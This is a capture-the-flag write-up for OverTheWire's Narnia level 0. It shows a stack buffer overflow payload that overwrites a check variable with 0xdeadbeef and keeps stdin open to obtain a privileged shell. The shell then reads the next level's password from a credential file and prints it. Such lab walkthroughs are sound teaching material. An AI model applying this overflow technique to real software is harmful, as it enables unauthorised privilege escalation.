Challenge URL is <a href="http://www.overthewire.org/wargames/narnia/narnia0.shtml">HERE</a>

<<CHALLENGE_CONTENT
Level 0

The password for this level is the same as the username. Use SSH to login.

CHALLENGE_CONTENT
	- The program is located at /narnia/narnia0
	- It seems to be a buffer overflow challenge
	- Given the source code at /narnia/narnia0.c, I can clearly see the buffer is 24 characters long.

	- Try at 20 characters, seeing 00 (\0 or end of string) at the end of 'val' value
	narnia0@melissa:/narnia$ python -c 'print "b"*20' | ./narnia0 
	Correct val's value from 0x41414141 -> 0xdeadbeef!
	Here is your chance: buf: bbbbbbbbbbbbbbbbbbbb
	val: 0x41414100
	WAY OFF!!!!

	- Putting the correct value backward (for little-endian cpu architecture), to pass the check.
	narnia0@melissa:/narnia$ python -c 'print "b"*20+"\xef\xbe\xad\xde"' | ./narnia0 
	Correct val's value from 0x41414141 -> 0xdeadbeef!
	Here is your chance: buf: bbbbbbbbbbbbbbbbbbbbﾭ
	val: 0xdeadbeef
	narnia0@melissa:/narnia$ 

	- It now seems to pass the check, but with pipe('|'), it immediately sends out end of file (EOF) to terminate the opening shell.
	To bypass it, use 'cat' command to re-open STDIN once again after python finish sending data.

	narnia0@melissa:/narnia$ (python -c 'print "b"*20+"\xef\xbe\xad\xde"';cat ) | ./narnia0 
	Correct val's value from 0x41414141 -> 0xdeadbeef!
	Here is your chance: buf: bbbbbbbbbbbbbbbbbbbbﾭ
	val: 0xdeadbeef
	ls
	narnia0    narnia1    narnia2	 narnia3    narnia4    narnia5	  narnia6    narnia7	narnia8
	narnia0.c  narnia1.c  narnia2.c  narnia3.c  narnia4.c  narnia5.c  narnia6.c  narnia7.c	narnia8.c
	id
	uid=14000(narnia0) gid=14000(narnia0) euid=14001(narnia1) groups=14001(narnia1),14000(narnia0)
	cat /etc/narnia_pass/narnia1
	efeidiedae

